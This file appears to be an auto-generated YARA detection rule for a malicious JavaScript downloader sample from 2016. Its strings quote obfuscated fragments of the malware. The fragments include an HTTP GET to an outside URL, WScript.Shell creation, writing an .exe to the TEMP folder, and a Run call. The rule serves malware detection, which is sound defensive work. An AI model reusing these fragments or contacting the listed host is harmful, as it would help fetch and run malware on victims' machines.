rule sig_20160330_651bd623c4e7d733ba631e26a23a14a4 {
  meta:
    description = "datamaliciousorder - file 20160330_651bd623c4e7d733ba631e26a23a14a4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5d7cd2be3acc65c0f9fa86405bc711d4a1752e5549fe3a1a08e5125a86af0ada"

  strings:
    $s1  = "function JJ(SG, N1){A = A * 1; return SG - N1;};" fullword ascii
    $s2  = "ZG[L](\"GET\", \"http://brand-obuv.ru/m3isud\", false);" fullword ascii
    $s3  = "var B = function CU() {return WScript[EQ](\"WScript\"+\".Shell\");}(), LI = 11;" fullword ascii
    $s4  = "if (ZG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VI() {return B[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MNGPTzLt071I.ex\" + \"e\";};" fullword ascii
    $s6  = "function OY(){return G1 + \"\";};" fullword ascii
    $s7  = "function QY() {return ((YI == true) && (YI == H)) ? 1 : A;};" fullword ascii
    $s8  = "function Q(XI){B[\"Run\"](XI, A, A);};" fullword ascii
    $s9  = "function F()" fullword ascii
    $s10 = "function LY(U) {var XR = (1, 2, 3, 4, 5, U); return XR;};" fullword ascii
    $s11 = "function G(){return EQ;};" fullword ascii
    $s12 = "function YB(){return 22;};" fullword ascii
    $s13 = "return JJ(PR, WY);" fullword ascii
    $s14 = "}while (YG);" fullword ascii
    $s15 = "var XY = new this[\"Date\"]();" fullword ascii
    $s16 = "H = true; " fullword ascii
    $s17 = "var H = false;" fullword ascii
    $s18 = "var YI = false;" fullword ascii
    $s19 = "YI = true; " fullword ascii
    $s20 = "var MR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}